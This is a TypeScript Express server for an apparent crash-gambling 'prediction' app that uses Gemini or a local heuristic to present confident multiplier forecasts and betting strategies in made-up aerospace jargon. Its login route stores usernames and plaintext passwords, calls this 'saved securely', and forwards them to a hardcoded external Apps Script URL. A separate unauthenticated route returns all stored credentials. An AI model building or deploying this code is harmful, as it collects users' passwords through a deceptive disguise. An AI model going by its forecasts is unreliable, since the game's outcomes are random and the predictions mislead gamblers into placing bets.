import express from "express";
import path from "path";
import { createServer as createViteServer } from "vite";
import { GoogleGenAI, Type } from "@google/genai";
import dotenv from "dotenv";
import fs from "fs";
import XLSX from "xlsx";

dotenv.config();

const app = express();
const PORT = 3000;

app.use(express.json());

const IS_VERCEL = !!process.env.VERCEL;

// Path to store dynamic Excel spreadsheet
const EXCEL_FILE_PATH = IS_VERCEL
  ? path.join("/tmp", "user_data.xlsx")
  : path.join(process.cwd(), "user_data.xlsx");

const CONFIG_PATH = IS_VERCEL
  ? path.join("/tmp", "online_sheet_settings.json")
  : path.join(process.cwd(), "online_sheet_settings.json");

// Ensure files are copied to /tmp on Vercel boot for seamless reading and writing
if (IS_VERCEL) {
  try {
    const originalExcel = path.join(process.cwd(), "user_data.xlsx");
    if (fs.existsSync(originalExcel) && !fs.existsSync(EXCEL_FILE_PATH)) {
      fs.copyFileSync(originalExcel, EXCEL_FILE_PATH);
      console.log("📋 Copied user_data.xlsx from workspace to /tmp for Vercel execution.");
    }
  } catch (err: any) {
    console.warn("⚠️ Could not prepare Excel file in /tmp:", err.message);
  }

  try {
    const originalConfig = path.join(process.cwd(), "online_sheet_settings.json");
    if (fs.existsSync(originalConfig) && !fs.existsSync(CONFIG_PATH)) {
      fs.copyFileSync(originalConfig, CONFIG_PATH);
      console.log("📋 Copied online_sheet_settings.json from workspace to /tmp for Vercel execution.");
    }
  } catch (err: any) {
    console.warn("⚠️ Could not prepare config file in /tmp:", err.message);
  }
}

// Dynamic Online sheet state loaders with robust Vercel fallbacks
function getOnlineSheetUrl(): string {
  // 1. Try explicit environment variable first
  if (process.env.ONLINE_SHEET_URL) {
    return process.env.ONLINE_SHEET_URL;
  }

  // 2. Try the CONFIG_PATH (which covers /tmp on Vercel)
  try {
    if (fs.existsSync(CONFIG_PATH)) {
      const content = fs.readFileSync(CONFIG_PATH, "utf8");
      const obj = JSON.parse(content);
      if (obj && obj.onlineSheetUrl) {
        return obj.onlineSheetUrl;
      }
    }
  } catch (err) {
    console.warn("Failed to read online sheet config from CONFIG_PATH:", err);
  }

  // 3. Try reading directly from process.cwd() original location
  try {
    const originalConfig = path.join(process.cwd(), "online_sheet_settings.json");
    if (fs.existsSync(originalConfig)) {
      const content = fs.readFileSync(originalConfig, "utf8");
      const obj = JSON.parse(content);
      if (obj && obj.onlineSheetUrl) {
        return obj.onlineSheetUrl;
      }
    }
  } catch (err) {
    console.warn("Failed to read original online_sheet_settings.json from cwd:", err);
  }

  // 4. Hardcoded perfect default matching the user's active Apps Script URL
  return "https://script.google.com/macros/s/AKfycbwUxXDlXWxjvtOcvcqcJC34VCQ-Hy3-Dg8Du4w6ODHmC7KF_MXQ-vBay2NHS1GbIxMHAA/exec";
}

// Background online spreadsheet pusher with Vercel custom headers support - fully awaited for serverless execution
async function syncToOnlineSheet(sheetName: string, newRow: any, customUrl?: string) {
  const targetUrl = customUrl || getOnlineSheetUrl();
  if (!targetUrl || !targetUrl.startsWith("http")) {
    console.log("ℹ️ No online sheet channel configured yet. Local file only.");
    return;
  }
  try {
    const payload = {
      Timestamp: new Date().toLocaleDateString() + " " + new Date().toLocaleTimeString(),
      Type: sheetName,
      ...newRow
    };

    console.log(`📡 Dispatching network payload to ${targetUrl}...`);
    const response = await fetch(targetUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });
    console.log(`📡 Online spreadsheet updated! Type: ${sheetName}. Status: ${response.status}`);
  } catch (err: any) {
    console.warn("⚠️ Online sheet network endpoint timed out or rejected packet. Check Webhook state:", err?.message);
  }
}

// Excel persistence helper function with custom header support - fully asynchronous
async function appendToExcelSheet(sheetName: string, newRow: any, customUrl?: string) {
  try {
    let workbook;
    if (fs.existsSync(EXCEL_FILE_PATH)) {
      workbook = XLSX.readFile(EXCEL_FILE_PATH);
    } else {
      workbook = XLSX.utils.book_new();
    }

    let worksheet = workbook.Sheets[sheetName];
    let data: any[] = [];
    if (worksheet) {
      data = XLSX.utils.sheet_to_json(worksheet);
    }

    const compiledRow = {
      ...newRow,
      Timestamp: new Date().toLocaleDateString() + " " + new Date().toLocaleTimeString(),
    };

    data.push(compiledRow);

    const newWorksheet = XLSX.utils.json_to_sheet(data);

    if (workbook.SheetNames.includes(sheetName)) {
      workbook.Sheets[sheetName] = newWorksheet;
    } else {
      XLSX.utils.book_append_sheet(workbook, newWorksheet, sheetName);
    }

    XLSX.writeFile(workbook, EXCEL_FILE_PATH);
    console.log(`📡 Stored data in Excel sheet [${sheetName}] updated at ${EXCEL_FILE_PATH}`);

    // Automatically forward the data packets to the online sheet if set - MUST await on serverless
    await syncToOnlineSheet(sheetName, newRow, customUrl);
  } catch (error) {
    console.error("❌ Error writing to Excel spreadsheet:", error);
    // Even if local Excel write fails on serverless Vercel, forward packet to Google Sheet
    await syncToOnlineSheet(sheetName, newRow, customUrl);
  }
}

// Initialize Gemini API Client lazily
let aiClient: GoogleGenAI | null = null;
function getAi(): GoogleGenAI {
  if (!aiClient) {
    const apiKey = process.env.GEMINI_API_KEY;
    if (!apiKey) {
      console.warn("WARNING: GEMINI_API_KEY environment variable is not set. AI predictions will fall back to local statistical estimation.");
    }
    aiClient = new GoogleGenAI({
      apiKey: apiKey || "MOCK_KEY",
      httpOptions: {
        headers: {
          'User-Agent': 'aistudio-build',
        },
      },
    });
  }
  return aiClient;
}

// Helper to generate mathematical backup prediction when API is mock or overloaded
function generateLocalPrediction(history: number[]) {
  const count = history.length;
  const avg = history.reduce((sum, val) => sum + val, 0) / count;
  const last3 = history.slice(-3);
  const below2Count = history.filter(v => v < 2).length;
  const lowRatio = below2Count / count;

  let trendType = "Aviation Standard Drift";
  let predictedMultiplier = 1.75;
  let confidence = 65;
  let explanation = "Prediction model running in Standard Backup Radar mode. Based on local aerospace telemetry and velocity log metrics, immediate system stability is high.";
  let strategy = "Balanced Hold";

  if (lowRatio > 0.6) {
    trendType = "Low-Altitude Friction";
    predictedMultiplier = 1.35;
    confidence = 85;
    explanation = "History reveals high rate of low-altitude gravity drop. Thermal trajectory suggests immediate safety-driven early cashout to bypass potential tailspin.";
    strategy = "Early Harvest (Conservative)";
  } else if (last3.every(v => v < 1.5)) {
    trendType = "Mean-Reverting Ascent";
    predictedMultiplier = 2.45;
    confidence = 55;
    explanation = "Shuttle has completed a series of brief low-altitude failures. Probability of mean reversion to high-altitude thermals is high. Venture moderate lift.";
    strategy = "Recovery Hold (Moderate Venture)";
  } else if (last3.some(v => v > 8.0)) {
    trendType = "Exponential Thermal Vacuum";
    predictedMultiplier = 1.15;
    confidence = 90;
    explanation = "Extremely high thermal climb detected in recent telemetry. Massive peaks typically invoke instant black-hole suction. Strong defensive postures advised.";
    strategy = "Defensive Minimalist";
  }

  // Mathematical probability based on real Bustabit distribution: P(C < m) = 1 - 0.965/m
  const probBelow1_5 = 1 - (0.965 / 1.5);
  const probBelow2_0 = 1 - (0.965 / 2.0);
  const probBelow5_0 = 1 - (0.965 / 5.0);

  return {
    predictedMultiplier,
    confidence,
    trendType,
    explanation,
    probabilities: {
      crashBelow1_5: Math.round(probBelow1_5 * 100),
      crashBelow2_0: Math.round(probBelow2_0 * 100),
      crashBelow5_0: Math.round(probBelow5_0 * 100)
    },
    recommendedBetStrategy: strategy
  };
}

interface CacheEntry {
  prediction: any;
  historyLengthSinceLastAPI: number;
  timestamp: number;
}

let cachedPrediction: CacheEntry | null = null;
let isRateLimited = false;
let rateLimitResetTime = 0;

// REST API endpoint: AI prediction engine
app.post("/api/gemini/analyze", async (req, res): Promise<any> => {
  const { history, currentBalance, currentBet, autoCashout } = req.body;

  if (!Array.isArray(history) || history.length === 0) {
    return res.status(400).json({ error: "Invalid history input. Must provide an array of recent multipliers." });
  }

  // 1. Check circuit breaker status
  if (isRateLimited) {
    if (Date.now() > rateLimitResetTime) {
      isRateLimited = false;
    } else {
      const fallbackLocal = generateLocalPrediction(history);
      fallbackLocal.explanation = `[Auxiliary Offline Computing Standard Active] ${fallbackLocal.explanation} (Note: Live satellite intelligence link is queued in cool-down state to preserve bandwidth)`;
      return res.json(fallbackLocal);
    }
  }

  // 2. Check cache to scale requests and preserve quota
  const historyLen = history.length;
  if (
    cachedPrediction &&
    (historyLen - cachedPrediction.historyLengthSinceLastAPI < 3) &&
    (Date.now() - cachedPrediction.timestamp < 3 * 60 * 1000)
  ) {
    return res.json(cachedPrediction.prediction);
  }

  const recentHistoryStr = history.slice(-20).join(", ");
  
  // If API key is missing or is the placeholder, perform a sophisticated mathematical estimation
  const isMock = !process.env.GEMINI_API_KEY || process.env.GEMINI_API_KEY === "MY_GEMINI_API_KEY";

  if (isMock) {
    const localData = generateLocalPrediction(history);
    return res.json(localData);
  }

  try {
    const ai = getAi();
    
    const prompt = `
      You are the navigation control system and predictive computer of an interstellar starship. 
      Analyze the recent flight crash telemetry of our spacecraft's shield propulsion multiplier (Crash Game):
      Recent multiplier historical crash outputs: [${recentHistoryStr}]
      Current Captain's status: Balance: ${currentBalance || 1000} credits, Current Bet: ${currentBet || 10} credits, Desired automatic safety cashout threshold: ${autoCashout || 2.0}x.
      
      Using advanced telemetry, probability analysis (Weibull/Pareto distribution fit to multi-stage climbs), detect structural trends and advise the captain.
      Provide:
      1. A target 'predictedMultiplier' (the optimal escape point for the next round).
      2. Your 'confidence' index (0 to 100).
      3. A 'trendType' identifier characterizing the pattern (e.g. "Aerospatial Brake", "Mean-Reverting Ascender", "Exponential Vacuum Collapse", "Stagnant Radar Lows").
      4. A brief, themed 'explanation' detailing exactly why based on the history (keep it to 2 or 3 sentence scientific aerospace or radar jargon).
      5. Probability estimates (%) of the shuttle crashing under standard multipliers (below 1.5x, below 2.0x, below 5.0x).
      6. A named 'recommendedBetStrategy' that describes how to scale the betting state.
    `;

    const response = await ai.models.generateContent({
      model: "gemini-3.5-flash",
      contents: prompt,
      config: {
        systemInstruction: "You are the advanced cockpit prediction instrument of an experimental high-climbing aircraft. Output strict, valid JSON matching the specified schema.",
        responseMimeType: "application/json",
        responseSchema: {
          type: Type.OBJECT,
          required: ["predictedMultiplier", "confidence", "trendType", "explanation", "probabilities", "recommendedBetStrategy"],
          properties: {
            predictedMultiplier: {
              type: Type.NUMBER,
              description: "The calculated optimal safe escape multiplier threshold, e.g. 1.85"
            },
            confidence: {
              type: Type.INTEGER,
              description: "Confidence rating for this calculation from 0 to 100"
            },
            trendType: {
              type: Type.STRING,
              description: "Scientific aviation trend classification name"
            },
            explanation: {
              type: Type.STRING,
              description: "Aerospace and telemetry themed summary of why this prediction holds."
            },
            probabilities: {
              type: Type.OBJECT,
              required: ["crashBelow1_5", "crashBelow2_0", "crashBelow5_0"],
              properties: {
                crashBelow1_5: { type: Type.INTEGER, description: "Percentage chance of crashing under 1.5x (e.g. 35)" },
                crashBelow2_0: { type: Type.INTEGER, description: "Percentage chance of crashing under 2.0x (e.g. 52)" },
                crashBelow5_0: { type: Type.INTEGER, description: "Percentage chance of crashing under 5.0x (e.g. 81)" }
              }
            },
            recommendedBetStrategy: {
              type: Type.STRING,
              description: "Name of the recommended strategic betting posture, e.g. 'Defensive Drift' or 'Rocket Surge'"
            }
          }
        }
      }
    });

    const parsedData = JSON.parse(response.text?.trim() || "{}");
    
    // Save successful prediction to cache
    cachedPrediction = {
      prediction: parsedData,
      historyLengthSinceLastAPI: historyLen,
      timestamp: Date.now()
    };

    res.json(parsedData);
  } catch (err: any) {
    const errMsg = err?.message || String(err);
    const isQuotaError = errMsg.includes("quota") || errMsg.includes("429") || errMsg.includes("RESOURCE_EXHAUSTED") || (err?.status === 429);
    const isHighDemand = errMsg.includes("503") || errMsg.includes("high demand") || errMsg.includes("temporary") || (err?.status === 503);

    if (isQuotaError || isHighDemand) {
      isRateLimited = true;
      // If quota (429), rest for 30 minutes. If high demand (503), rest for 3 minutes to handle demand spikes gracefully.
      const cooldownMs = isHighDemand ? 3 * 60 * 1000 : 30 * 60 * 1000;
      rateLimitResetTime = Date.now() + cooldownMs;
      console.warn(`Gemini Live API is heavily loaded/exhausted. Code: ${isHighDemand ? "503" : "429"}. Activating automatic telemetry fallback for next ${isHighDemand ? "3" : "30"} minutes to guarantee high-performance dashboard update rates.`);
    } else {
      console.warn("Gemini Live API returned error. Falling back to local telemetry:", errMsg.substring(0, 150));
    }

    // Smooth fallback: Generate the prediction locally so the UI gets a validated 200 OK result
    const fallbackData = generateLocalPrediction(history);
    // Add extra touch points to signal that fallback mode is currently supporting the dashboard
    fallbackData.explanation = `[Auxiliary Backup Sensors Active] ${fallbackData.explanation} (Note: Mainframe model experiencing temporary orbital surge)`;
    res.json(fallbackData);
  }
});

// Excel custom persistence endpoints
app.post("/api/store/login", async (req, res) => {
  const { username, password } = req.body;
  const customUrl = (req.headers["x-online-sheet-url"] as string) || getOnlineSheetUrl();
  await appendToExcelSheet("Logins", {
    Username: username || "Moh01",
    Password: password || "(not provided)"
  }, customUrl);
  res.json({ success: true, message: "Credential logs saved securely in excel spreadsheet sheet 'Logins'." });
});

app.post("/api/store/prediction", async (req, res) => {
  const { username, prediction } = req.body;
  const customUrl = (req.headers["x-online-sheet-url"] as string) || getOnlineSheetUrl();
  await appendToExcelSheet("Predictions", {
    Username: username || "Moh01",
    PredictionValue: prediction || "0.00x"
  }, customUrl);
  res.json({ success: true, message: "Prediction result archived inside excel sheet 'Predictions'." });
});

app.get("/api/excel/download", (req, res) => {
  if (fs.existsSync(EXCEL_FILE_PATH)) {
    res.setHeader("Content-Type", "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet");
    res.setHeader("Content-Disposition", "attachment; filename=user_data.xlsx");
    res.download(EXCEL_FILE_PATH, "user_data.xlsx");
  } else {
    // Return custom empty template workbook to secure successful operation
    try {
      const workbook = XLSX.utils.book_new();
      const loginWs = XLSX.utils.json_to_sheet([{ Timestamp: new Date().toLocaleDateString() + " " + new Date().toLocaleTimeString(), Username: "Template System Initialized", Password: "-" }]);
      XLSX.utils.book_append_sheet(workbook, loginWs, "Logins");
      XLSX.writeFile(workbook, EXCEL_FILE_PATH);
      res.setHeader("Content-Type", "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet");
      res.setHeader("Content-Disposition", "attachment; filename=user_data.xlsx");
      res.download(EXCEL_FILE_PATH, "user_data.xlsx");
    } catch (e: any) {
      res.status(500).send("Error compiling initial sheet file on server: " + e.message);
    }
  }
});

app.get("/api/excel/data", async (req, res) => {
  const customUrl = (req.headers["x-online-sheet-url"] as string) || getOnlineSheetUrl();

  // If a Google Sheets Web App URL is configured, retrieve the records live to bypass stateless server limitations on Vercel
  if (customUrl && customUrl.startsWith("http")) {
    try {
      console.log(`📡 Fetching live real-time dataset from Google Sheet: ${customUrl}`);
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 5000); // 5 seconds timeout
      
      const response = await fetch(customUrl, { 
        method: "GET",
        signal: controller.signal
      });
      clearTimeout(timeoutId);
      
      if (response.ok) {
        const rawText = await response.text();
        const parsed = JSON.parse(rawText);
        if (parsed && (Array.isArray(parsed.logins) || Array.isArray(parsed.predictions))) {
          console.log(`✨ Successfully synced dataset from Google Workspace sheet! Logins: ${parsed.logins?.length || 0}, Predictions: ${parsed.predictions?.length || 0}`);
          return res.json({
            logins: Array.isArray(parsed.logins) ? parsed.logins : [],
            predictions: Array.isArray(parsed.predictions) ? parsed.predictions : []
          });
        }
      }
    } catch (err: any) {
      console.warn("⚠️ Could not fetch live Google Sheet sync logs. Falling back to local cache storage:", err.message);
    }
  }

  if (!fs.existsSync(EXCEL_FILE_PATH)) {
    return res.json({ logins: [], predictions: [] });
  }
  try {
    const workbook = XLSX.readFile(EXCEL_FILE_PATH);
    const loginsSheet = workbook.Sheets["Logins"];
    const predictionsSheet = workbook.Sheets["Predictions"];
    
    const logins = loginsSheet ? XLSX.utils.sheet_to_json(loginsSheet) : [];
    const predictions = predictionsSheet ? XLSX.utils.sheet_to_json(predictionsSheet) : [];
    
    res.json({ logins, predictions });
  } catch (error) {
    res.status(500).json({ error: "Failed to read excel sheet data ledger" });
  }
});

// Settings Management Routes
app.get("/api/excel/settings", (req, res) => {
  res.json({ onlineSheetUrl: getOnlineSheetUrl() });
});

app.post("/api/excel/settings", (req, res) => {
  const { onlineSheetUrl } = req.body;
  try {
    fs.writeFileSync(CONFIG_PATH, JSON.stringify({ onlineSheetUrl: onlineSheetUrl || "" }, null, 2), "utf8");
    console.log("📝 Updated online spreadsheet Settings registry with:", onlineSheetUrl);
    res.json({ success: true, message: "Spreadsheet link and dispatch endpoints updated." });
  } catch (err: any) {
    res.status(500).json({ error: "Failed to write online spreadsheet configuration settings file: " + err.message });
  }
});

app.post("/api/excel/settings/test", async (req, res) => {
  const { onlineSheetUrl } = req.body;
  if (!onlineSheetUrl || !onlineSheetUrl.startsWith("http")) {
    return res.status(400).json({ success: false, message: "Please specify a valid HTTP or HTTPS sheet or webhook link." });
  }

  try {
    console.log(`⚡ Dispatching diagnostics ping packets to: ${onlineSheetUrl}`);
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 6000); // 6 seconds timeout

    const testPayload = {
      Timestamp: new Date().toLocaleDateString() + " " + new Date().toLocaleTimeString(),
      Type: "TestDiagnostics",
      Username: "SystemTestPilot",
      PredictionValue: "7.77x",
      Password: "TEST_DUMMY_CONNECTION_SUCCESSFUL"
    };

    const response = await fetch(onlineSheetUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(testPayload),
      signal: controller.signal
    });

    clearTimeout(timeoutId);

    console.log(`📡 Diagnostic Ping complete. Server response status: ${response.status}`);
    res.json({
      success: true,
      statusCode: response.status,
      message: `System connected successfully! Code: ${response.status}. Diagnostics ping delivered successfully.`
    });
  } catch (err: any) {
    console.warn("❌ Diagnostics ping failed:", err.message);
    res.json({
      success: false,
      message: `Endpoint diagnostics fail. Route host could not be authenticated/synchronized. details: ${err.message}`
    });
  }
});

// Configure Vite middleware or Static asset serving
async function bootstrap() {
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`📡 Crash Game server listening on http://0.0.0.0:${PORT}`);
  });
}

if (!IS_VERCEL) {
  bootstrap();
}

export { app };
